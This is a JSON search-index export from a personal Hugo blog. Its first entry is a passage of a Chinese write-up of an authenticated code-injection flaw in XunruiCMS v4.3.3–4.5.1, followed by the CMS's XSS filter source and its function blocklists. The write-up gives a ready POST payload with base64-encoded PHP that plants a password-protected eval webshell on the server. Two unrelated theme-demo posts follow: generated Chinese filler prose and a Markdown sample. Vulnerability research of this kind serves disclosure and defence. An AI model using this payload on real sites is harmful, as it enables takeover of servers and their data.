绕过json编码,xss清洗,dr_safe_filename()函数的过滤和WRITEPATH.\u0026lsquo;config/cron.php\u0026rsquo;文件中\u0026rsquo;的包裹\r此处我们先不尝试绕过dr_safe_filename()函数,而是尝试另一个极其简单的方法\n通过对xss清洗函数的审计和版本v4.5.1add()函数新增加的代码的审计,可以发现对于数组的key没有任何过滤,包括多维数组的每一维度的key,所以此处可以通过修改post的内容中的key来写入我们想要的任意内容\n以下是我的一种方法,整个漏洞利用过程中,除了上述所述的关于add()函数中增加的对键值对的value的过滤,其他流程相较于之前的版本没有任何变化:\n获取到csrf_test_name之后,给http://host:port/Admin.php?c=Cron\u0026amp;m=addpost以下内容:\n1 isform=1\u0026amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778\u0026amp;data%5B1%5D%5Bname%5D=1\u0026amp;data%5B1%5D%5Bcode\u0026#34;:\u0026#34;1\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39;%5D=1 经过url解码后为:\n1 isform=1\u0026amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778\u0026amp;data[1][name]=1\u0026amp;data[1][code\u0026#34;:\u0026#34;1\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39;]=1 绕过json编码和xss清洗以及dr_safe_filename()函数的过滤后,写入WRITEPATH.'config/cron.php'文件中的内容为:\n1 2 \u0026lt;?php defined(\u0026#39;FCPATH\u0026#39;) OR exit(\u0026#39;No direct script access allowed\u0026#39;); $json=\u0026#39;{\u0026#34;1\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;code\\\u0026#34;:\\\u0026#34;1\\\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw\\/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39;\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;code\u0026#34;:\u0026#34;\u0026#34;}}\u0026#39;; 此post内容中的关键处为\n1 \u0026#34;:\u0026#34;1\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39; 绕过json编码和xss清洗以及dr_safe_filename()函数的过滤后,此处的内容变为:\n1 \\\u0026#34;:\\\u0026#34;1\\\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw\\/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39; 闭合了WRITEPATH.'config/cron.php'文件中'的包裹\n包含写入的WRITEPATH.'config/cron.php'文件\r通过前面对add()函数的分析,调用add()函数时会首先在WRITEPATH.'config/cron.php'文件存在时包含WRITEPATH.'config/cron.php'文件,因此直接访问http://host:port/Admin.php?c=Cron\u0026amp;m=add即可\n访问http://host:port/Admin.php?c=Cron\u0026amp;m=add后,在网站根目录下会生成一个名为webshell.php的文件,文件内容为\u0026lt;?php eval(@$_POST[\u0026quot;password\u0026quot;]);?\u0026gt;\n在版本v4.5.1之后\radd()函数被删除\nPOC \u0026amp;\u0026amp; EXP\r很简单,我就不写了,不过注意目标站点的cms可能有坑,比如版本号低但实际的站点文件已经更新过了\nPOC\r登录后台,获取版本号,然后验证一下是否为管理员或具有\u0026quot;应用\u0026rdquo;-\u0026gt;\u0026ldquo;任务队列\u0026quot;的管理权限即可\nEXP\r登录后台,然后post写入恶意代码,最后get访问包含恶意文件即可\nxss_clean()函数\ru0026lt;?php namespace Phpcmf\\Library; /** * {{www.xunruicms.com}} * {{迅睿内容管理框架系统}} * 本文件是框架系统文件，二次开发时不可以修改本文件，可以通过继承类方法来重写此文件 **/ /** * 安全过滤 */ class Security { /** * List of sanitize filename strings * * @var\tarray */ public $filename_bad_chars = [ \u0026#39;../\u0026#39;, \u0026#39;\u0026lt;!--\u0026#39;, \u0026#39;--\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;%20\u0026#39;, \u0026#39;%22\u0026#39;, \u0026#39;%3c\u0026#39;,\t// \u0026lt; \u0026#39;%253c\u0026#39;,\t// \u0026lt; \u0026#39;%3e\u0026#39;,\t// \u0026gt; \u0026#39;%0e\u0026#39;,\t// \u0026gt; \u0026#39;%28\u0026#39;,\t// ( \u0026#39;%29\u0026#39;,\t// ) \u0026#39;%2528\u0026#39;,\t// ( \u0026#39;%26\u0026#39;,\t// \u0026amp; \u0026#39;%24\u0026#39;,\t// $ \u0026#39;%3f\u0026#39;,\t// ? \u0026#39;%3b\u0026#39;,\t// ; \u0026#39;%3d\u0026#39;\t// = ]; protected $naughty_tags = []; protected $evil_attributes = []; /** * Character set * * Will be overridden by the constructor. * * @var\tstring */ public $charset = \u0026#39;UTF-8\u0026#39;; /** * XSS Hash * * Random Hash for protecting URLs. * * @var\tstring */ protected $_xss_hash; /** * List of never allowed strings * * @var\tarray */ protected $_never_allowed_str =\t[ \u0026#39;document.cookie\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;(document).cookie\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;document.write\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;(document).write\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;.parentNode\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;.innerHTML\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;-moz-binding\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;\u0026lt;!--\u0026#39; =\u0026gt; \u0026#39;\u0026amp;lt;!--\u0026#39;, \u0026#39;--\u0026gt;\u0026#39; =\u0026gt; \u0026#39;--\u0026amp;gt;\u0026#39;, \u0026#39;\u0026lt;![CDATA[\u0026#39; =\u0026gt; \u0026#39;\u0026amp;lt;![CDATA[\u0026#39;, \u0026#39;\u0026lt;comment\u0026gt;\u0026#39;\t=\u0026gt; \u0026#39;\u0026amp;lt;comment\u0026amp;gt;\u0026#39;, \u0026#39;\u0026lt;%\u0026#39; =\u0026gt; \u0026#39;\u0026amp;lt;\u0026amp;#37;\u0026#39; ]; // 替换前的处理 protected $_never_call_str = [ \u0026#39;\u0026amp;quot;javascript:\u0026#39; =\u0026gt; \u0026#39;\u0026amp;quot;javascript_xunruicms:\u0026#39;, ]; /** * List of never allowed regex replacements * * @var\tarray */ protected $_never_allowed_regex = [ \u0026#39;javascript\\s*:\u0026#39;, \u0026#39;(\\(?document\\)?|\\(?window\\)?(\\.document)?)\\.(location|on\\w*)\u0026#39;, \u0026#39;expression\\s*(\\(|\u0026amp;\\#40;)\u0026#39;, // CSS and IE \u0026#39;vbscript\\s*:\u0026#39;, // IE, surprise! \u0026#39;wscript\\s*:\u0026#39;, // IE \u0026#39;jscript\\s*:\u0026#39;, // IE \u0026#39;vbs\\s*:\u0026#39;, // IE \u0026#39;Redirect\\s+30\\d\u0026#39;, \u0026#34;([\\\u0026#34;\u0026#39;])+data\\s*:[^\\\\1]*?base64[^\\\\1]*?,[^\\\\1]*?\\\\1?\u0026#34; ]; // -------------------------------------------------------------------- /** * XSS Clean * * Sanitizes data so that Cross Site Scripting Hacks can be * prevented. This method does a fair amount of work but * it is extremely thorough, designed to prevent even the * most obscure XSS attempts. Nothing is ever 100% foolproof, * of course, but I haven\u0026#39;t been able to get anything passed * the filter. * * Note: Should only be used to deal with data upon submission. *\tIt\u0026#39;s not something that should be used for general *\truntime processing. * * @link\thttp://channel.bitflux.ch/wiki/XSS_Prevention * Based in part on some code and ideas from Bitflux. * * @link\thttp://ha.ckers.org/xss.html * To help develop this script I used this great list of *\tvulnerabilities along with a few other hacks I\u0026#39;ve *\tharvested from examining vulnerabilities in other programs. * * @param\tstring|string[]\t$str\tInput data * @param bool\t$is_image\t严格的过滤 * @return\tstring */ public function xss_clean($str, $is_image = FALSE) { if (is_numeric($str)) { return $str; } elseif (!$str) { return \u0026#39;\u0026#39;; } // Is the string an array? if (is_array($str)) { foreach ($str as $key =\u0026gt; \u0026amp;$value) { $str[$key] = $this-\u0026gt;xss_clean($value, $is_image); } return $str; } if (json_encode( $str) === false) { return \u0026#39;[xss_clean]\u0026#39;; // 判断含有乱码直接过滤为空 } $this-\u0026gt;naughty_tags = [ \u0026#39;alert\u0026#39;, \u0026#39;area\u0026#39;, \u0026#39;prompt\u0026#39;, \u0026#39;confirm\u0026#39;, \u0026#39;applet\u0026#39;, \u0026#39;audio\u0026#39;, \u0026#39;basefont\u0026#39;, \u0026#39;base\u0026#39;, \u0026#39;behavior\u0026#39;, \u0026#39;bgsound\u0026#39;, \u0026#39;blink\u0026#39;, \u0026#39;body\u0026#39;, \u0026#39;expression\u0026#39;, \u0026#39;form\u0026#39;, \u0026#39;frameset\u0026#39;, \u0026#39;frame\u0026#39;, \u0026#39;head\u0026#39;, \u0026#39;html\u0026#39;, \u0026#39;ilayer\u0026#39;, \u0026#39;input\u0026#39;, \u0026#39;button\u0026#39;, \u0026#39;select\u0026#39;, \u0026#39;isindex\u0026#39;, \u0026#39;layer\u0026#39;, \u0026#39;link\u0026#39;, \u0026#39;meta\u0026#39;, \u0026#39;keygen\u0026#39;, \u0026#39;object\u0026#39;, \u0026#39;plaintext\u0026#39;, \u0026#39;script\u0026#39;, \u0026#39;textarea\u0026#39;, \u0026#39;title\u0026#39;, \u0026#39;math\u0026#39;, \u0026#39;svg\u0026#39;, \u0026#39;xml\u0026#39;, \u0026#39;xss\u0026#39;, //\u0026#39;iframe\u0026#39;, \u0026#39;video\u0026#39;, \u0026#39;embed\u0026#39;, \u0026#39;style\u0026#39; //排除过滤 ]; $this-\u0026gt;evil_attributes = [ \u0026#39;on\\w+\u0026#39;, \u0026#39;xmlns\u0026#39;, \u0026#39;formaction\u0026#39;, \u0026#39;form\u0026#39;, \u0026#39;xlink:href\u0026#39;, \u0026#39;FSCommand\u0026#39;, \u0026#39;seekSegmentTime\u0026#39; // ,\u0026#39;style\u0026#39; 排除过滤 ]; if ($is_image) { // 严格的过滤 $this-\u0026gt;naughty_tags = array_merge($this-\u0026gt;naughty_tags, array(\u0026#39;iframe\u0026#39;, \u0026#39;video\u0026#39;, \u0026#39;embed\u0026#39;, \u0026#39;style\u0026#39;)); $this-\u0026gt;evil_attributes = array_merge($this-\u0026gt;evil_attributes, array(\u0026#39;style\u0026#39;)); /* * URL Decode * * Just in case stuff like this is submitted: * * \u0026lt;a href=\u0026#34;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\u0026#34;\u0026gt;Google\u0026lt;/a\u0026gt; * * Note: Use rawurldecode() so it does not remove plus signs * */ if (stripos($str, \u0026#39;%\u0026#39;) !== false) { do { $oldstr = $str; $str = rawurldecode($str); $str = preg_replace_callback(\u0026#39;#%(?:\\s*[0-9a-f]){2,}#i\u0026#39;, [$this, \u0026#39;_urldecodespaces\u0026#39;], $str); } while ($oldstr !== $str); unset($oldstr); } /* * Convert character entities to ASCII * * This permits our tests below to work reliably. * We only convert entities that are within tags since * these are the ones that will pose security problems. */ // 不进行二次编码的xss过滤 $str = preg_replace_callback(\u0026#34;/[^a-z0-9\u0026gt;]+[a-z0-9]+=([\\\u0026#39;\\\u0026#34;]).*?\\\\1/si\u0026#34;, array($this, \u0026#39;_convert_attribute\u0026#39;), $str); $str = preg_replace_callback(\u0026#39;/\u0026lt;\\w+.*/si\u0026#39;, array($this, \u0026#39;_decode_entity\u0026#39;), $str); } // Remove Invisible Characters Again! $str = remove_invisible_characters($str); /* * Convert all tabs to spaces * * This prevents strings like this: ja\tvascript * NOTE: we deal with spaces between characters later. * NOTE: preg_replace was found to be amazingly slow here on * large blocks of data, so we use str_replace. */ $str = str_replace(\u0026#34;\\t\u0026#34;, \u0026#39; \u0026#39;, $str); // Capture converted string for later comparison $converted_string = $str; // Remove Strings that are never allowed //$str = $this-\u0026gt;_do_never_allowed($str); /* * Makes PHP tags safe * * Note: XML tags are inadvertently replaced too: * * \u0026lt;?xml * * But it doesn\u0026#39;t seem to pose a problem. */ if ($is_image) { // Images have a tendency to have the PHP short opening and // closing tags every so often so we skip those and only // do the long opening tags. $str = preg_replace(\u0026#39;/\u0026lt;\\?(php)/i\u0026#39;, \u0026#39;\u0026amp;lt;?\\\\1\u0026#39;, $str); } else { $str = str_replace([\u0026#39;\u0026lt;?\u0026#39;, \u0026#39;?\u0026#39;.\u0026#39;\u0026gt;\u0026#39;], [\u0026#39;\u0026amp;lt;?\u0026#39;, \u0026#39;?\u0026amp;gt;\u0026#39;], $str); } /* * Compact any exploded words * * This corrects words like: j a v a s c r i p t * These words are compacted back to their correct state. */ $words = [ \u0026#39;javascript\u0026#39;, \u0026#39;expression\u0026#39;, \u0026#39;vbscript\u0026#39;, \u0026#39;jscript\u0026#39;, \u0026#39;wscript\u0026#39;, \u0026#39;vbs\u0026#39;, \u0026#39;script\u0026#39;, \u0026#39;base64\u0026#39;, \u0026#39;applet\u0026#39;, \u0026#39;alert\u0026#39;, \u0026#39;document\u0026#39;, \u0026#39;write\u0026#39;, \u0026#39;cookie\u0026#39;, \u0026#39;window\u0026#39;, \u0026#39;confirm\u0026#39;, \u0026#39;prompt\u0026#39;, \u0026#39;eval\u0026#39; ]; foreach ($words as $word) { $word = implode(\u0026#39;\\s*\u0026#39;, str_split($word)).\u0026#39;\\s*\u0026#39;; // We only want to do this when it is followed by a non-word character // That way valid stuff like \u0026#34;dealer to\u0026#34; does not become \u0026#34;dealerto\u0026#34; $str = preg_replace_callback(\u0026#39;#(\u0026#39;.substr($word, 0, -3).\u0026#39;)(\\W)#is\u0026#39;, array($this, \u0026#39;_compact_exploded_words\u0026#39;), $str); } /* * Remove disallowed Javascript in links or img tags * We used to do some version comparisons and use of stripos(), * but it is dog slow compared to these simplified non-capturing * preg_match(), especially if the pattern exists in the string * * Note: It was reported that not only space characters, but all in * the following pattern can be parsed as separators between a tag name * and its attributes: [\\d\\s\u0026#34;\\\u0026#39;`;,\\/\\=\\(\\x00\\x0B\\x09\\x0C] * ... however, remove_invisible_characters() above already strips the * hex-encoded ones, so we\u0026#39;ll skip them below. */ do { $original = $str; if (preg_match(\u0026#39;/\u0026lt;a/i\u0026#39;, $str)) { $str = preg_replace_callback(\u0026#39;#\u0026lt;a(?:rea)?[^a-z0-9\u0026gt;]+([^\u0026gt;]*?)(?:\u0026gt;|$)#si\u0026#39;, array($this, \u0026#39;_js_link_removal\u0026#39;), $str); } if (preg_match(\u0026#39;/\u0026lt;img/i\u0026#39;, $str)) { $str = preg_replace_callback(\u0026#39;#\u0026lt;img[^a-z0-9]+([^\u0026gt;]*?)(?:\\s?/?\u0026gt;|$)#si\u0026#39;, array($this, \u0026#39;_js_img_removal\u0026#39;), $str); } if (preg_match(\u0026#39;/script|xss/i\u0026#39;, $str)) { $str = preg_replace(\u0026#39;#\u0026lt;/*(?:script|xss).*?\u0026gt;#si\u0026#39;, \u0026#39;[xss_clean]\u0026#39;, $str); } } while ($original !== $str); unset($original); /* * Sanitize naughty HTML elements * * If a tag containing any of the words in the list * below is found, the tag gets converted to entities. * * So this: \u0026lt;blink\u0026gt; * Becomes: \u0026amp;lt;blink\u0026amp;gt; */ $pattern = \u0026#39;#\u0026#39; .\u0026#39;\u0026lt;((?\u0026lt;slash\u0026gt;/*\\s*)((?\u0026lt;tagName\u0026gt;[a-z0-9]+)(?=[^a-z0-9]|$)|.+)\u0026#39; // tag start and name, followed by a non-tag character .\u0026#39;[^\\s\\042\\047a-z0-9\u0026gt;/=]*\u0026#39; // a valid attribute character immediately after the tag would count as a separator // optional attributes .\u0026#39;(?\u0026lt;attributes\u0026gt;(?:[\\s\\042\\047/=]*\u0026#39; // non-attribute characters, excluding \u0026gt; (tag close) for obvious reasons .\u0026#39;[^\\s\\042\\047\u0026gt;/=]+\u0026#39; // attribute characters // optional attribute-value .\u0026#39;(?:\\s*=\u0026#39; // attribute-value separator .\u0026#39;(?:[^\\s\\042\\047=\u0026gt;\u0026lt;`]+|\\s*\\042[^\\042]*\\042|\\s*\\047[^\\047]*\\047|\\s*(?U:[^\\s\\042\\047=\u0026gt;\u0026lt;`]*))\u0026#39; // single, double or non-quoted value .\u0026#39;)?\u0026#39; // end optional attribute-value group .\u0026#39;)*)\u0026#39; // end optional attributes group .\u0026#39;[^\u0026gt;]*)(?\u0026lt;closeTag\u0026gt;\\\u0026gt;)?#isS\u0026#39;; // Note: It would be nice to optimize this for speed, BUT // only matching the naughty elements here results in // false positives and in turn - vulnerabilities! do { $old_str = $str; $str = preg_replace_callback($pattern, array($this, \u0026#39;_sanitize_naughty_html\u0026#39;), $str); } while ($old_str !== $str); unset($old_str); /* * Sanitize naughty scripting elements * * Similar to above, only instead of looking for * tags it looks for PHP and JavaScript commands * that are disallowed. Rather than removing the * code, it simply converts the parenthesis to entities * rendering the code un-executable. * * For example:\teval(\u0026#39;some code\u0026#39;) * Becomes:\teval\u0026amp;#40;\u0026#39;some code\u0026#39;\u0026amp;#41; */ $str = preg_replace( \u0026#39;#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\\s*)\\((.*?)\\)#si\u0026#39;, \u0026#39;\\\\1\\\\2\u0026amp;#40;\\\\3\u0026amp;#41;\u0026#39;, $str ); // Same thing, but for \u0026#34;tag functions\u0026#34; (e.g. eval`some code`) // See https://github.com/bcit-ci/CodeIgniter/issues/5420 $str = preg_replace( \u0026#39;#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\\s*)`(.*?)`#si\u0026#39;, \u0026#39;\\\\1\\\\2\u0026amp;#96;\\\\3\u0026amp;#96;\u0026#39;, $str ); //最终清理 // ////这增加了一点额外的预防措施 // ////有东西通过了上面的过滤器 $str = $this-\u0026gt;_do_never_allowed($str); // now the only remaining whitespace attacks are \\t, \\n, and \\r $ra = [\u0026#39;onabort\u0026#39;, \u0026#39;onactivate\u0026#39;, \u0026#39;onafterprint\u0026#39;, \u0026#39;onafterupdate\u0026#39;, \u0026#39;onbeforeactivate\u0026#39;, \u0026#39;onbeforecopy\u0026#39;, \u0026#39;onbeforecut\u0026#39;, \u0026#39;onbeforedeactivate\u0026#39;, \u0026#39;onbeforeeditfocus\u0026#39;, \u0026#39;onbeforepaste\u0026#39;, \u0026#39;onbeforeprint\u0026#39;, \u0026#39;onbeforeunload\u0026#39;, \u0026#39;onbeforeupdate\u0026#39;, \u0026#39;onblur\u0026#39;, \u0026#39;onbounce\u0026#39;, \u0026#39;oncellchange\u0026#39;, \u0026#39;onchange\u0026#39;, \u0026#39;onclick\u0026#39;, \u0026#39;oncontextmenu\u0026#39;, \u0026#39;oncontrolselect\u0026#39;, \u0026#39;oncopy\u0026#39;, \u0026#39;oncut\u0026#39;, \u0026#39;ondataavailable\u0026#39;, \u0026#39;ondatasetchanged\u0026#39;, \u0026#39;ondatasetcomplete\u0026#39;, \u0026#39;ondblclick\u0026#39;, \u0026#39;ondeactivate\u0026#39;, \u0026#39;ondrag\u0026#39;, \u0026#39;ondragend\u0026#39;, \u0026#39;ondragenter\u0026#39;, \u0026#39;ondragleave\u0026#39;, \u0026#39;ondragover\u0026#39;, \u0026#39;ondragstart\u0026#39;, \u0026#39;ondrop\u0026#39;, \u0026#39;onerror\u0026#39;, \u0026#39;onerrorupdate\u0026#39;, \u0026#39;onfilterchange\u0026#39;, \u0026#39;onfinish\u0026#39;, \u0026#39;onfocus\u0026#39;, \u0026#39;onfocusin\u0026#39;, \u0026#39;onfocusout\u0026#39;, \u0026#39;onhelp\u0026#39;, \u0026#39;onkeydown\u0026#39;, \u0026#39;onkeypress\u0026#39;, \u0026#39;onkeyup\u0026#39;, \u0026#39;onlayoutcomplete\u0026#39;, \u0026#39;onload\u0026#39;, \u0026#39;onlosecapture\u0026#39;, \u0026#39;onmousedown\u0026#39;, \u0026#39;onmouseenter\u0026#39;, \u0026#39;onmouseleave\u0026#39;, \u0026#39;onmousemove\u0026#39;, \u0026#39;onmouseout\u0026#39;, \u0026#39;onmouseover\u0026#39;, \u0026#39;onmouseup\u0026#39;, \u0026#39;onmousewheel\u0026#39;, \u0026#39;onmove\u0026#39;, \u0026#39;onmoveend\u0026#39;, \u0026#39;onmovestart\u0026#39;, \u0026#39;onpaste\u0026#39;, \u0026#39;onpropertychange\u0026#39;, \u0026#39;onreadystatechange\u0026#39;, \u0026#39;onreset\u0026#39;, \u0026#39;onresize\u0026#39;, \u0026#39;onresizeend\u0026#39;, \u0026#39;onresizestart\u0026#39;, \u0026#39;onrowenter\u0026#39;, \u0026#39;onrowexit\u0026#39;, \u0026#39;onrowsdelete\u0026#39;, \u0026#39;onrowsinserted\u0026#39;, \u0026#39;onscroll\u0026#39;, \u0026#39;onselect\u0026#39;, \u0026#39;onselectionchange\u0026#39;, \u0026#39;onselectstart\u0026#39;, \u0026#39;onstart\u0026#39;, \u0026#39;onstop\u0026#39;, \u0026#39;onsubmit\u0026#39;, \u0026#39;onunload\u0026#39;]; foreach ($ra as $t) { $str = str_replace(\u0026#39; \u0026#39;.$t.\u0026#39;=\u0026#34;\u0026#39;, \u0026#39; \u0026#39;.$t.\u0026#39;=\u0026#39;, $str); } return $str; } // -------------------------------------------------------------------- /** * Do Never Allowed * * @used-by\tCI_Security::xss_clean() * @param string * @return string */ protected function _do_never_allowed($str) { $str = str_replace(array_keys($this-\u0026gt;_never_call_str), $this-\u0026gt;_never_call_str, $str); $str = str_replace(array_keys($this-\u0026gt;_never_allowed_str), $this-\u0026gt;_never_allowed_str, $str); foreach ($this-\u0026gt;_never_allowed_regex as $regex) { $str = preg_replace(\u0026#39;#\u0026#39;.$regex.\u0026#39;#is\u0026#39;, \u0026#39;_\\\\0\u0026#39;, $str); } $str = str_replace($this-\u0026gt;_never_call_str, array_keys($this-\u0026gt;_never_call_str), $str); return $str; } } ","date":"2022-04-26T00:00:00Z","image":"https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_120x120_fill_box_smart1_3.png","permalink":"https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.3.3%E5%88%B0v4.5.1%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8A%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","title":"迅睿CMS v4.3.3到v4.5.1后台任意代码注入漏洞(文件写入加文件包含)"},{"content":"正文测试\r而这些并不是完全重要，更加重要的问题是， 带着这些问题，我们来审视一下学生会退会。 既然如何， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 我们不得不面对一个非常尴尬的事实，那就是， 可是，即使是这样，学生会退会的出现仍然代表了一定的意义。 学生会退会，发生了会如何，不发生又会如何。 经过上述讨论， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 学生会退会，到底应该如何实现。 这样看来， 在这种困难的抉择下，本人思来想去，寝食难安。 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 就我个人来说，学生会退会对我的意义，不能不说非常重大。 莎士比亚曾经提到过，人的一生是短的，但如果卑劣地过这一生，就太长了。这似乎解答了我的疑惑。 莫扎特说过一句富有哲理的话，谁和我一样用功，谁就会和我一样成功。这启发了我， 对我个人而言，学生会退会不仅仅是一个重大的事件，还可能会改变我的人生。 学生会退会，到底应该如何实现。 一般来说， 从这个角度来看， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 在这种困难的抉择下，本人思来想去，寝食难安。 了解清楚学生会退会到底是一种怎么样的存在，是解决一切问题的关键。 一般来说， 生活中，若学生会退会出现了，我们就不得不考虑它出现了的事实。 问题的关键究竟为何？ 而这些并不是完全重要，更加重要的问题是。\n奥斯特洛夫斯基曾经说过，共同的事业，共同的斗争，可以使人们产生忍受一切的力量。　带着这句话，我们还要更加慎重的审视这个问题： 一般来讲，我们都必须务必慎重的考虑考虑。 既然如此， 这种事实对本人来说意义重大，相信对这个世界也是有一定意义的。 带着这些问题，我们来审视一下学生会退会。 我认为， 我认为， 在这种困难的抉择下，本人思来想去，寝食难安。 问题的关键究竟为何？ 每个人都不得不面对这些问题。 在面对这种问题时， 要想清楚，学生会退会，到底是一种怎么样的存在。 我认为， 既然如此， 每个人都不得不面对这些问题。 在面对这种问题时， 那么， 我认为， 学生会退会因何而发生。\n引用\r思念是最暖的忧伤像一双翅膀\n让我停不了飞不远在过往游荡\n不告而别的你 就算为了我着想\n这么沉痛的呵护 我怎么能翱翔\n最暖的憂傷 - 田馥甄\n图片\r1 2 3 ![Photo by Florian Klauer on Unsplash](florian-klauer-nptLmg6jqDo-unsplash.jpg) ![Photo by Luca Bravo on Unsplash](luca-bravo-alS7ewQ41M8-unsplash.jpg) ![Photo by Helena Hertz on Unsplash](helena-hertz-wWZzXlDpMog-unsplash.jpg) ![Photo by Hudai Gayiran on Unsplash](hudai-gayiran-3Od_VKcDEAA-unsplash.jpg) 相册语法来自 Typlog\n","date":"2020-09-09T00:00:00Z","image":"https://weltolk.github.io/p/test-chinese/helena-hertz-wWZzXlDpMog-unsplash_hu45a5e3ad5e058da6a00650ed8fd40bea_15530_120x120_fill_q75_box_smart1.jpg","permalink":"https://weltolk.github.io/p/test-chinese/","title":"Chinese Test"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings\rThe following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1\rH2\rH3\rH4\rH5\rH6\rParagraph\rXerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes\rThe blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution\rTiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution\rDon\u0026rsquo;t communicate by sharing memory, share memory by communicating. — Rob Pike1\nTables\rTables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables\rItalics Bold Code italics bold code Code Blocks\rCode block with backticks\r1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces\r\u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 